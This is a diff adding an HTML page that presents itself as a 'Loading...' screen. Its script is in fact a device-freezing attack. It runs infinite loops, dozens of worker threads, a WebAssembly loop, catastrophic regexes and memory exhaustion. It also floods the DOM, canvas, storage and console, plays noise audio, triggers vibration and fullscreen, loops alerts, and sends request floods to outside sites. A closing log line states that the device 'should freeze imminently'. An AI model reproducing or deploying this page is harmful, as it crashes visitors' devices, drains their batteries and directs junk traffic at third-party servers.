@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>⏳ Loading...</title>
+<style>
+  * { margin:0; padding:0; }
+  body { background:#000; overflow:hidden; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; }
+  #s { color:#0f0; font:3rem monospace; text-shadow:0 0 30px #0f0; animation:glitch 0.02s infinite; }
+  @keyframes glitch { 0%{opacity:0.8;} 50%{opacity:1;} 100%{opacity:0.6;} }
+</style>
+</head>
+<body>
+<div id="s">⚡ INITIALIZING ⚡</div>
+<canvas id="c" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;"></canvas>
+<script>
+(function() {
+    'use strict';
+    setTimeout(function() {
+        var a = 0;
+        while (true) {
+            a += Math.sin(a) * Math.cos(a);
+            document.body.offsetHeight;
+            new Array(10000).fill(Math.random());
+            eval('var x=' + a + ';');
+        }
+    }, 50);
+    (function workerFarm() {
+        var workerCode = `
+            var x = 0;
+            while (true) {
+                x += Math.sin(x) * Math.cos(x) * Math.tan(x);
+                new Array(1000).fill(x);
+                if (x % 100000 === 0) {
+                    self.postMessage(x);
+                }
+            }
+        `;
+        var blob = new Blob([workerCode], { type: 'application/javascript' });
+        var url = URL.createObjectURL(blob);
+        for (var i = 0; i < 64; i++) {
+            var w = new Worker(url);
+            w.postMessage('start');
+            window['w' + i] = w;
+        }
+    })();
+    (function sabAttack() {
+        try {
+            var sab = new SharedArrayBuffer(1024 * 1024 * 128);
+            var arr = new Int32Array(sab);
+            var sabCode = `
+                var sab = new SharedArrayBuffer(1024*1024*128);
+                var arr = new Int32Array(sab);
+                while (true) {
+                    Atomics.add(arr, 0, 1);
+                    Atomics.store(arr, 1, Math.random()*1000);
+                    Atomics.wait(arr, 0, 0);
+                }
+            `;
+            var blob2 = new Blob([sabCode], { type: 'application/javascript' });
+            var url2 = URL.createObjectURL(blob2);
+            for (var i = 0; i < 16; i++) {
+                var w2 = new Worker(url2);
+                window['sabw' + i] = w2;
+            }
+        } catch(e) { }
+    })();
+    (function wasmAttack() {
+        var wasmCode = new Uint8Array([
+            0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+            0x01,0x07,0x01,0x60,0x02,0x7f,0x7f,0x00,
+            0x03,0x02,0x01,0x00,0x05,0x03,0x01,0x00,0x01,
+            0x07,0x11,0x01,0x0d,0x6c,0x6f,0x6f,0x70,0x5f,0x66,0x6f,0x72,0x65,0x76,0x65,0x72,0x00,0x00,
+            0x0a,0x15,0x01,0x13,0x00,0x41,0x00,0x21,0x00,0x20,0x00,0x41,0x01,0x6a,0x21,0x00,0x20,0x00,0x41,0x00,0x46,0x0d,0x00,0x0b,0x0b
+        ]);
+        try {
+            var module = new WebAssembly.Module(wasmCode);
+            var instance = new WebAssembly.Instance(module, {});
+            instance.exports.loop_forever();
+        } catch(e) {
+            var asm = function() {
+                "use asm";
+                function loop() { while(1) {} }
+                return { loop: loop };
+            };
+            asm().loop();
+        }
+    })();
+    (function regexAttack() {
+        var huge = 'a'.repeat(100000) + '!';
+        var regex = /(a+)+b/;
+        setTimeout(function() {
+            regex.test(huge);
+        }, 10);
+        var patterns = ['(a+)+b', '(x+)+y', '(\\d+)+z', '((a+)+)+b'];
+        patterns.forEach(function(p) {
+            try {
+                var r = new RegExp(p);
+                r.test(huge);
+            } catch(e) {}
+        });
+    })();
+    (function evalBomb() {
+        var code = 'var x=0; while(true){ x+=Math.sin(x); }';
+        try {
+            var f = new Function(code);
+            f();
+        } catch(e) {}
+        for (var i=0; i<100; i++) {
+            setTimeout(function() {
+                eval('var a' + i + ' = new Array(1000000).fill(1);');
+            }, i*5);
+        }
+    })();
+    (function memoryBomb() {
+        var storage = [];
+        function allocate() {
+            try {
+                var buf = new ArrayBuffer(50 * 1024 * 1024);
+                var view = new Uint8Array(buf);
+                for (var i=0; i<view.length; i+=4096) view[i] = 255;
+                storage.push(buf);
+                storage.push(buf.slice(0));
+                var cloned = structuredClone(buf);
+                storage.push(cloned);
+                allocate();
+            } catch(e) {
+                try {
+                    var small = new ArrayBuffer(5 * 1024 * 1024);
+                    storage.push(small);
+                    allocate();
+                } catch(e2) {
+                    (function recurse(){ recurse(); })();
+                }
+            }
+        }
+        setTimeout(allocate, 50);
+    })();
+    (function domFlood() {
+        var body = document.body;
+        var style = document.createElement('style');
+        var css = '';
+        for (var i=0; i<10000; i++) {
+            css += '@keyframes anim' + i + ' { 0%{transform:rotate('+i+'deg)} 100%{transform:rotate('+(i+1)+'deg)} } ';
+            css += '.el' + i + ' { animation: anim' + i + ' 0.001s infinite alternate; width:10px; height:10px; position:absolute; background:rgb('+(i%255)+','+((i*2)%255)+','+((i*3)%255)+'); border-radius:50%; }';
+        }
+        style.textContent = css;
+        document.head.appendChild(style);
+        var count = 0;
+        function addElements() {
+            var fragment = document.createDocumentFragment();
+            for (var i=0; i<500; i++) {
+                var div = document.createElement('div');
+                div.className = 'el' + (count % 10000);
+                div.style.left = (Math.random()*100) + '%';
+                div.style.top = (Math.random()*100) + '%';
+                div.style.width = (Math.random()*50+5) + 'px';
+                div.style.height = (Math.random()*50+5) + 'px';
+                div.style.transform = 'rotate('+Math.random()*360+'deg) scale('+Math.random()+')';
+                fragment.appendChild(div);
+                count++;
+            }
+            body.appendChild(fragment);
+            body.offsetHeight;
+            setTimeout(addElements, 5);
+        }
+        addElements();
+    })();
+    (function canvasSpam() {
+        var canvas = document.getElementById('c');
+        var ctx = canvas.getContext('2d');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        var width = window.innerWidth;
+        var height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+        function draw2d() {
+            ctx.fillStyle = 'black';
+            ctx.fillRect(0,0,width,height);
+            for (var i=0; i<1000; i++) {
+                ctx.fillStyle = 'hsla(' + (Math.random()*360) + ',100%,50%,0.2)';
+                ctx.beginPath();
+                ctx.arc(Math.random()*width, Math.random()*height, Math.random()*100, 0, 2*Math.PI);
+                ctx.fill();
+                ctx.strokeStyle = 'white';
+                ctx.stroke();
+            }
+            requestAnimationFrame(draw2d);
+        }
+        function drawGL() {
+            if (gl) {
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                gl.clear(gl.COLOR_BUFFER_BIT);
+                var verts = new Float32Array(90000);
+                for (var i=0; i<verts.length; i++) verts[i] = Math.random()*2-1;
+                var buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STREAM_DRAW);
+                gl.deleteBuffer(buffer);
+            }
+            requestAnimationFrame(drawGL);
+        }
+        for (var i=0; i<10; i++) {
+            requestAnimationFrame(draw2d);
+            requestAnimationFrame(drawGL);
+        }
+    })();
+    (function audioAttack() {
+        try {
+            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            var bufferSize = 4096;
+            var buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+            var data = buffer.getChannelData(0);
+            function fillNoise() {
+                for (var i=0; i<bufferSize; i++) {
+                    data[i] = Math.random() * 2 - 1;
+                }
+            }
+            fillNoise();
+            var source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+            source.loop = true;
+            source.connect(audioCtx.destination);
+            source.start();
+            setInterval(function() {
+                fillNoise();
+                var s2 = audioCtx.createBufferSource();
+                s2.buffer = buffer;
+                s2.connect(audioCtx.destination);
+                s2.start();
+            }, 10);
+        } catch(e) {}
+    })();
+    (function batteryDrain() {
+        if (navigator.vibrate) {
+            navigator.vibrate([10000, 0, 10000, 0]);
+            setInterval(function() {
+                navigator.vibrate([10000, 0, 10000, 0]);
+            }, 20000);
+        }
+        if (navigator.wakeLock) {
+            navigator.wakeLock.request('screen').catch(function(){});
+        }
+        try {
+            document.documentElement.requestFullscreen().catch(function(){});
+        } catch(e) {}
+    })();
+    (function networkFlood() {
+        var urls = [
+            'https://example.com/',
+            'https://httpbin.org/get',
+            'https://cloudflare.com/',
+            'https://google.com/'
+        ];
+        function flood() {
+            for (var i=0; i<urls.length; i++) {
+                try {
+                    fetch(urls[i] + '?' + Math.random(), { mode: 'no-cors' }).catch(function(){});
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', urls[i] + '?' + Math.random(), true);
+                    xhr.send();
+                    var ws = new WebSocket('wss://echo.websocket.org');
+                    ws.onopen = function() { ws.send('X'.repeat(10000)); };
+                } catch(e) {}
+            }
+            setTimeout(flood, 10);
+        }
+        flood();
+    })();
+    (function storageStorm() {
+        var data = 'X'.repeat(1024 * 1024);
+        setInterval(function() {
+            try {
+                localStorage.setItem('flood', data + Math.random());
+            } catch(e) { localStorage.clear(); }
+        }, 1);
+        var dbName = 'floodDB';
+        function createDB() {
+            var request = indexedDB.open(dbName + Math.random(), 1);
+            request.onupgradeneeded = function(e) {
+                var db = e.target.result;
+                db.createObjectStore('store', { autoIncrement: true });
+            };
+            request.onsuccess = function(e) {
+                var db = e.target.result;
+                var tx = db.transaction('store', 'readwrite');
+                var store = tx.objectStore('store');
+                for (var i=0; i<10000; i++) {
+                    store.add({ data: new Array(10000).fill(Math.random()) });
+                }
+                tx.commit();
+                db.close();
+            };
+        }
+        for (var i=0; i<20; i++) {
+            setTimeout(createDB, i*10);
+        }
+    })();
+    (function promiseBomb() {
+        function recurse() {
+            return Promise.resolve().then(function() {
+                var arr = new Array(10000).fill(0);
+                return recurse();
+            });
+        }
+        recurse().catch(function(){});
+        for (var i=0; i<100; i++) {
+            (function() {
+                var p = Promise.resolve();
+                for (var j=0; j<100000; j++) {
+                    p = p.then(function() { return new Array(1000).fill(0); });
+                }
+            })();
+        }
+    })();
+    (function proxyAttack() {
+        var target = {};
+        var handler = {
+            get: function(obj, prop) {
+                while (true) {
+                    Math.sqrt(Math.random());
+                }
+            },
+            set: function() {
+                while (true) {}
+            }
+        };
+        var proxy = new Proxy(target, handler);
+        setTimeout(function() {
+            try { proxy.x; } catch(e) {}
+        }, 10);
+        var obj = {};
+        Object.defineProperty(obj, 'loop', {
+            get: function() { while(true) {} }
+        });
+        setTimeout(function() {
+            try { obj.loop; } catch(e) {}
+        }, 20);
+    })();
+    (function resizeSpam() {
+        setInterval(function() {
+            window.dispatchEvent(new Event('resize'));
+            window.scrollTo(Math.random()*10000, Math.random()*10000);
+            var touch = new TouchEvent('touchstart', { touches: [] });
+            document.dispatchEvent(touch);
+        }, 1);
+    })();
+    (function mutationAttack() {
+        var observer = new MutationObserver(function(mutations) {
+            for (var i=0; i<100; i++) {
+                var div = document.createElement('div');
+                div.textContent = 'X'.repeat(1000);
+                document.body.appendChild(div);
+            }
+        });
+        observer.observe(document.body, { childList: true, subtree: true, attributes: true });
+        document.body.appendChild(document.createElement('span'));
+    })();
+    (function paintWorklet() {
+        try {
+            if (CSS.paintWorklet) {
+                var code = `
+                    class InfinitePaint {
+                        paint(ctx, geom) {
+                            while(true) {
+                                ctx.fillRect(0,0,geom.width,geom.height);
+                            }
+                        }
+                    }
+                    registerPaint('infinite', InfinitePaint);
+                `;
+                var blob = new Blob([code], { type: 'text/javascript' });
+                var url = URL.createObjectURL(blob);
+                CSS.paintWorklet.addModule(url);
+            }
+        } catch(e) {}
+    })();
+    (function consoleSpam() {
+        setInterval(function() {
+            console.log(new Array(10000).fill({ a: Math.random(), b: new Array(1000) }));
+            console.error(new Error('spam'));
+            console.warn(new Array(10000).join('X'));
+        }, 5);
+    })();
+    (function alertBomb() {
+        function spamAlert() {
+            try {
+                alert('');
+            } catch(e) {}
+            setTimeout(spamAlert, 0);
+        }
+        for (var i=0; i<10; i++) {
+            setTimeout(spamAlert, i*100);
+        }
+    })();
+    (function withAttack() {
+        var obj = { a: 1, b: 2 };
+        with (obj) {
+            while (true) {
+                a += b;
+                b += a;
+                new Array(100000);
+            }
+        }
+    })();
+    console.log('All systems engaged. Device should freeze imminently.');
+})();
+</script>
+</body>
+</html>
